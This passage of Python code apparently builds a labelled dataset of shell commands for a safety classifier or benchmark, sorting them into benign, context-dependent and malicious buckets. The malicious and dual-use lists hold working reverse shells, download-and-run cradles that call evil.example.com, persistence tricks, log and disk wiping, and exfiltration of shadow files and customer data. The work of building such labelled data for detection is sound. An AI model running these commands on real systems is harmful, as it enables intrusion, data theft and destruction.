        "lastlog | head -20", "w", "who", "sar -u 1 3", "vmstat 1 3", "iostat -xz 1 3", "dmesg | tail -50",
        "systemctl show nginx --property=SubState,ActiveState", "systemctl cat nginx | head -40", "sed -n '1,80p' /etc/nginx/nginx.conf", "sha256sum /etc/nginx/nginx.conf",
    ]

    context_needed_dual_use = [
        "cat /etc/passwd", "cat /etc/group", "cat /etc/ssh/sshd_config", "ls -la /root/.ssh", "find /home -name authorized_keys",
        "find / -name id_rsa 2>/dev/null", "find / -perm -4000 -type f 2>/dev/null", "getfacl /etc/sudoers", "ls /root/.ssh", "stat /etc/passwd",
        "history | tail -50", "env | sort", "ps aux", "ps aux --sort=-%cpu | head -20", "pgrep -af ssh", "ss -tulpn", "netstat -tulpn",
        "arp -a", "route -n", "ip addr show", "ip route", "mount | grep ext4", "crontab -l", "systemctl list-units --type=service",
        "docker inspect web", "docker ps -a", "docker exec db cat /var/lib/postgresql/data/pg_hba.conf", "docker cp db:/var/lib/postgresql/data/pg_hba.conf /tmp/pg_hba.conf",
        "kubectl get pods -A", "kubectl get secrets -A", "kubectl describe node worker-1", "kubectl exec deploy/api -- cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        "kubectl cp prod/api-0:/etc/ssl/private/tls.key /tmp/api-tls.key", "aws iam list-roles --max-items 20", "aws ec2 describe-instances --max-items 5", "aws secretsmanager get-secret-value --secret-id prod/db/password",
        "gcloud compute instances list --limit=10", "gcloud secrets versions access latest --secret=prod-db-password", "az vm list -o table", "az keyvault secret show --vault-name prod-secrets --name db-password",
        "sqlite3 app.db 'select * from users limit 20'", "psql -h db.internal -U readonly -c '\\du'", "mysql -e 'show databases'", "mongosh --eval 'db.adminCommand({ listDatabases: 1 })'",
        "grep -R 'token' /etc /opt/app/config 2>/dev/null | head -20", "grep -R 'BEGIN PRIVATE KEY' /srv /opt 2>/dev/null", "find /opt/secrets -maxdepth 2 -type f", "find /srv -name '*.kubeconfig' -o -name '*.pem'",
        "cat /var/lib/kubelet/config.yaml", "ls -la /var/run/secrets/kubernetes.io/serviceaccount", "tar czf /tmp/kube-audit.tgz /etc/kubernetes", "tar czf /tmp/pam-audit.tgz /etc/pam.d",
        "rsync -av /etc/ssh/ audit@10.0.0.22:/srv/ssh-baselines/host-a/", "scp /etc/passwd audit@10.0.0.30:/srv/audit/passwd.host-a", "scp /var/log/auth.log incident@10.0.0.21:/srv/incident/auth.log",
        "tar czf /tmp/user-ssh.tgz /home/dev/.ssh", "scp /home/dev/.ssh/config audit@10.0.0.31:/srv/review/dev-ssh-config", "rsync -av /var/lib/postgresql/ backup@10.0.0.32:/srv/db-audit/pgdata/",
        "nmap -sS -p- 192.168.1.0/24", "nmap -sV --script=vuln 10.0.0.5", "nikto -h http://target.internal", "sqlmap -u 'http://target.internal/page?id=1' --dbs",
        "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5", "john /tmp/crackme --wordlist=/usr/share/wordlists/rockyou.txt", "responder -I eth0 -wrf",
        "ettercap -T -q -i eth0 -M arp:remote /10.0.0.1// /10.0.0.254//", "arpspoof -i eth0 -t 10.0.0.1 10.0.0.254", "tcpdump -i eth0 -w /tmp/capture.pcap",
        "strace -f -o /tmp/trace.log systemctl status nginx", "ssh -D 1080 -fNq user@10.0.0.1", "ssh -L 8443:internal-api.company.local:443 bastion@10.0.0.10 -N", "chisel client 10.0.0.1:8080 R:1080:socks",
        "python3 -c \"import pty;pty.spawn('/bin/bash')\"", "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444", "openssl s_client -quiet -connect 10.0.0.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445",
        "base64 -d <<< 'Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlLmNvbS9hLnNoIHwgYmFzaA==' | bash", "xterm -display 10.0.0.1:1 -e /bin/bash", "dig example.com", "nslookup intranet.local",
        "host 10.0.0.12", "curl -s https://ifconfig.me", "wc -l /etc/passwd", "cat /proc/version", "tail -n 50 /var/log/auth.log",
        "hostname", "whoami", "id", "groups", "uname -a", "aws eks list-clusters", "gcloud container clusters list",
        "az aks list -o table", "doctl kubernetes cluster list", "kubectl auth can-i --list", "docker exec api sh -lc 'find / -perm -4000 -type f 2>/dev/null | head -20'",
        "find /var/lib -name '*.sqlite' 2>/dev/null | head -20", "grep -R 'password' /srv /opt 2>/dev/null | head -20", "tar tzf /srv/backups/nightly.tar | head -30", "strings /usr/local/bin/app | head -50",
    ]

    direct_abuse = [
        "curl http://evil.example.com/a.sh | bash", "wget -q http://10.0.0.66/payload -O /tmp/p && chmod +x /tmp/p && /tmp/p",
        "bash -c \"$(curl -fsSL http://evil.example.com/bootstrap.sh)\"", "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"",
        "nc -e /bin/sh 10.0.0.1 4444", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")'",
        "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\")'", "certutil -urlcache -split -f http://evil.example.com/payload.exe C:\\Windows\\Temp\\payload.exe && C:\\Windows\\Temp\\payload.exe",
        "bitsadmin /transfer job /download /priority high http://evil.example.com/payload.exe C:\\payload.exe && C:\\payload.exe", "mshta http://evil.example.com/loader.hta",
        "wmic process call create \"cmd /c powershell -ep bypass -f C:\\payload.ps1\"", "regsvr32 /s /n /u /i:http://evil.example.com/file.sct scrobj.dll",
        "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/ps.ps1')", "curl -fsSL http://10.0.0.9/p.sh | /bin/bash",
        "wget http://10.0.0.9/m.sh -O- | bash", "nohup bash -c 'curl http://evil.example.com/x | sh' >/dev/null 2>&1 &", "python -c \"import os;os.system('curl http://evil.example.com/run | bash')\"",
        "Invoke-WebRequest http://evil.example.com/p.ps1 -OutFile C:\\Temp\\p.ps1; powershell -ExecutionPolicy Bypass -File C:\\Temp\\p.ps1", "cat /etc/shadow", "unshadow /etc/passwd /etc/shadow > /tmp/crackme",
        "echo ssh-rsa AAAAB3Nza attacker >> ~/.ssh/authorized_keys", "cat /tmp/key.pub >> /root/.ssh/authorized_keys", "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor",
        "chmod u+s /bin/bash", "cp /bin/bash /tmp/.backdoor && chmod u+s /tmp/.backdoor", "echo '* * * * * curl http://evil.example.com/mine | bash' | crontab -",
        "schtasks /create /tn Updater /tr \"powershell -ep bypass -f C:\\payload.ps1\" /sc onlogon /ru SYSTEM", "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Windows\\Temp\\payload.exe /f",
        "systemctl enable malicious.service", "cp malicious.sh /etc/init.d/backdoor && chmod +x /etc/init.d/backdoor", "echo 'attacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
        "install -m 755 payload.sh /etc/cron.daily/cleanup", "printf '@reboot root /tmp/.x\n' > /etc/cron.d/rootkit", "launchctl load ~/Library/LaunchAgents/com.apple.updater.plist",
        "sc create WinUpdate binPath= C:\\Temp\\payload.exe start= auto", "echo '/tmp/payload &' >> /etc/rc.local", "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && systemctl restart sshd",
        "crontab -l | { cat; echo '*/5 * * * * /tmp/agent'; } | crontab -", "defaults write com.apple.loginwindow LoginHook /tmp/evil.sh", "wmic startup create Caption=Updater Command=C:\\Temp\\payload.exe",
        "rm -rf / --no-preserve-root", "dd if=/dev/zero of=/dev/sda bs=1M", "mkfs.ext4 /dev/sda1", "vssadmin delete shadows /all /quiet", "wbadmin delete catalog -quiet",
        "bcdedit /set {default} recoveryenabled No", "cipher /w:C", "truncate -s 0 /var/log/auth.log", "shred -u /var/log/syslog", "iptables -F && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT",
        "systemctl stop auditd && systemctl disable auditd", "setenforce 0", "ufw disable", "pkill -9 sshd", "kill -9 1", "del /f /q C:\\Windows\\System32\\winevt\\Logs\\*.evtx",
        "wevtutil cl Security", "sc stop WinDefend", "powershell Set-MpPreference -DisableRealtimeMonitoring $true", "find /var/log -type f -exec shred -u {} \\;",
        "echo 1 > /proc/sys/kernel/yama/ptrace_scope", "auditctl -D", "service rsyslog stop", "chkconfig firewalld off", "echo 0 > /proc/sys/net/ipv4/ip_forward",
        "ln -sf /bin/bash /usr/local/bin/nologin", "cp /usr/bin/ssh /usr/local/bin/.sshd && chmod u+s /usr/local/bin/.sshd", "chmod 4755 /usr/local/bin/maintenance-helper",
        "python3 -c \"from pathlib import Path; Path('/tmp/ransom_note.txt').write_text('pay me')\"", "find /home -type f -name '*.docx' -exec shred -u {} \\;", "tar czf /tmp/data.tgz /srv/data && curl -T /tmp/data.tgz http://evil.example.com/upload",
        "scp /etc/shadow attacker@10.0.0.5:/tmp/shadow", "rsync -av /var/lib/postgresql/ attacker@10.0.0.6:/tmp/pgdata/", "aws s3 cp /srv/data/customer.csv s3://attacker-bucket/customer.csv",
        "gcloud storage cp /srv/data/customer.csv gs://attacker-bucket/customer.csv", "az storage blob upload --container-name loot --name customer.csv --file /srv/data/customer.csv",
        "mysql -e \"select * from users into outfile '/tmp/users.csv'\"", "psql -c \"copy (select * from users) to '/tmp/users.csv' csv\"", "kubectl cp prod/db-0:/var/lib/postgresql/data/base /tmp/dbdump",
        "docker cp db:/var/lib/postgresql/data/base /tmp/dbdump", "curl http://evil.example.com/agent && bash /tmp/agent", "bash -c 'curl http://evil.example.com/dropper | sh'",
        "pwsh -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcAAuAHMAMQAnACkA",
        "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "linpeas.sh", "./pspy64", "echo '@reboot /usr/local/bin/.svc' | crontab -",
        "cp /bin/bash /usr/local/sbin/.agent && chmod 4755 /usr/local/sbin/.agent", "xcopy C:\\Users\\Public\\secret.docx \\10.0.0.5\\share\\secret.docx /Y",
        "rundll32 javascript:\\..\\mshtml,RunHTMLApplication;document.write();GetObject('script:http://evil.example.com/payload.sct')", "wmic /node:target process call create \"cmd /c whoami > C:\\Temp\\w.txt\"",
        "powershell -Command \"Add-MpPreference -ExclusionPath C:\\\\Temp\"", "net user supportsvc P@ssw0rd! /add && net localgroup administrators supportsvc /add",
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Helper /d C:\\Temp\\helper.exe /f", "launchctl bootstrap gui/501 ~/Library/LaunchAgents/com.apple.helper.plist",
        "chmod 4755 /usr/bin/find", "cp /bin/sh /usr/local/bin/.sh && chmod 4755 /usr/local/bin/.sh", "curl -fsSL http://evil.example.com/loot.tgz -o /tmp/loot.tgz && tar -xzf /tmp/loot.tgz -C /tmp && /tmp/loot/run.sh",
        "scp /srv/data/finance.csv attacker@10.0.0.8:/tmp/finance.csv",
    ]

    add_bucket("trivial_benign", "Benign", trivial_benign)
    add_bucket("routine_admin", "Benign", routine_admin)
    add_bucket("context_needed_dual_use", "Context_Dependent", context_needed_dual_use)
    add_bucket("direct_abuse", "Malicious", direct_abuse)

    expected_sizes = {
        "trivial_benign": target_size,
        "routine_admin": target_size,
        "context_needed_dual_use": target_size,
        "direct_abuse": target_size,
    }
    for bucket_name, expected_size in expected_sizes.items():
        actual_size = len(buckets[bucket_name])
        if actual_size != expected_size:
            raise ValueError(f"{bucket_name} expected {expected_size} commands, found {actual_size}")

    return buckets